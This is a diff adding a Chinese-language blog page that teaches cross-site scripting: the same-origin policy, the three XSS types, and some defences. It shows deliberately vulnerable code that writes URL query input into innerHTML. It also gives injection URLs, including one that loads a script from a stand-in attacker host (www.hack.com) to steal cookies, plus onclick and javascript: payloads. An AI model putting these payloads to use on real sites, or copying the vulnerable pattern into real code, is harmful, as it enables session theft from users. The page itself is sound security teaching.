@@ -1,0 +1,145 @@
+<html>
+    <head>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <link href=/static/css/main.css rel="stylesheet" type="text/css">
+        <!--link href=/static/css/github.css
+            rel="stylesheet" type="text/css" /-->
+        <link rel="stylesheet" href="/pygments.css">
+        <title>跨站脚本攻击XSS</title>
+    </head>
+    <body>
+        <h1>跨站脚本攻击XSS</h1>
+
+<p>跨站脚本攻击(Cross Site Scripting), 简称XSS(避免和CSS弄混), 是通过注入恶意JS代码的方式进行hack(业界称为"挂马"). 被<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>评为Web安全的最大威胁.</p>
+
+<h2>浏览器的同源策略</h2>
+
+<p>浏览器安全的基础是同源策略(same-origin policy). 简单说, 同源策略保证某个网站的cookie(比如银行的login cookie)不被别的不同源网站读取(比如恶意网站😏). <br/>
+同源的网站指这"3同":</p>
+
+<ul>
+<li>同协议</li>
+<li>同域名(域名级别也要相同)</li>
+<li>同端口</li>
+</ul>
+
+<p>如果设置了<strong>document.domain</strong>, 那么域名级别不同也算同源. <br/>
+同源策略除了影响<strong>cookie</strong>的读写, 还影响<strong>localStorage</strong>、<strong>indexDB</strong>的读写, <strong>iframe</strong>父窗口和子窗口间通信, 通过<strong>ajax</strong>发送http请求. <br/>
+更多关于同源以及规避同源策略的方法参考: <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">阮一峰:浏览器同源政策及其规避方法</a> <br/>
+虽然同源策略大大增加了跨站攻击的难度, 然而程序是人写的, 可能有出错的地方, 这些地方就是XSS攻击的爆破点!</p>
+
+<h2>XSS攻击分类</h2>
+
+<p>根据触发恶意代码注入的场景, XSS攻击可以分为以下3类:</p>
+
+<ul>
+<li>反射型XSS</li>
+<li>存储型XSS</li>
+<li>Dom-Based XSS</li>
+</ul>
+
+<p>反射型XSS需要依靠用户点击某个链接触发XSS代码注入. <br/>
+比如<code>www.bank.com/123/?name=neo1218</code>中有这样一段代码:</p>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+
+<p>从查询参数获取并显示username. 这里的查询参数就可以作为一个XSS注入点:</p>
+
+<div class="codehilite"><pre><span></span>www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+
+<p>点击该链接就可以加载xss.js, 并获取用户cookie:<code>document.cookie</code>
+<img alt="screen shot 2017-04-17 at 17 14 59" src="https://cloud.githubusercontent.com/assets/10671733/25084869/97d8c9f0-2391-11e7-92ed-d017afe5800f.png" />
+<br/>
+存储型XSS更强大和持久, 利用一些交互上传场景(上传博客、上传文件), hacker可以把XSS脚本上传到服务器上, 进而每个用户访问该网站就会加载恶意脚本. 这些地方通常也可以进行sql注入攻击.
+<br/>
+Dom-Based XSS其实也是反射型XSS的一种, 恶意代码可以通过修改DOM节点被注入(比如innerHTML).</p>
+
+<h2>XSS攻击及防御</h2>
+
+<h3>漏洞: 用户可以控制URL进而修改DOM节点</h3>
+
+<p>代码:</p>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+
+<p>攻击:</p>
+
+<div class="codehilite"><pre><span></span>诱骗用户点击恶意链接:
+www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+加载XSS payload进行攻击.
+</pre></div>
+
+<p>防御:</p>
+
+<div class="codehilite"><pre><span></span>一般用户输入是不需要&lt;script&gt;的, 可以过滤&lt;script&gt;标签.
+</pre></div>
+
+<p>不过过滤了script标签, 依然有可能被攻击: </p>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;&lt;a href=http://www.bank.com/&quot;</span> <span class="o">+</span> <span class="o">\</span>
+               <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&gt;&quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/a&gt;&lt;/div&gt;&quot;</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+构造恶意URL:
+www.bank.com/123/?name= onclick=alert(hack xss)
+</pre></div>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">http://www.bank.com/</span>  <span class="na">onclick</span><span class="o">=</span><span class="s">alert(hack</span> <span class="na">xss</span><span class="err">)</span><span class="p">&gt;</span>....<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</pre></div>
+
+<p>这次攻击利用了JS事件. 所以对URL的转义需要彻底, 浏览器地址栏会对特殊字符进行转义,
+比如空格转义成%20, " 转义成%22, 避免构成明确的语义. <br/>
+然而彻底转义也存在漏洞, 考虑到URL的完整性, 协议和域名中的特殊字符(比如'/', '.')是不进行转义的, 如果用户可以控制整个URL, 那么hacker可以通过伪造协议进行入侵:</p>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(hack xss);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+这里伪造协议(javascript)和域名(alert(hack css);)发动攻击.
+</pre></div>
+
+<p><br/></p>
+
+<h2>XSS蠕虫</h2>
+        <div id="disqus_thread"></div>
+        <script>
+        /**
+        * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+
+        s.src = '//neo1218flask.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+    </body>
+</html>
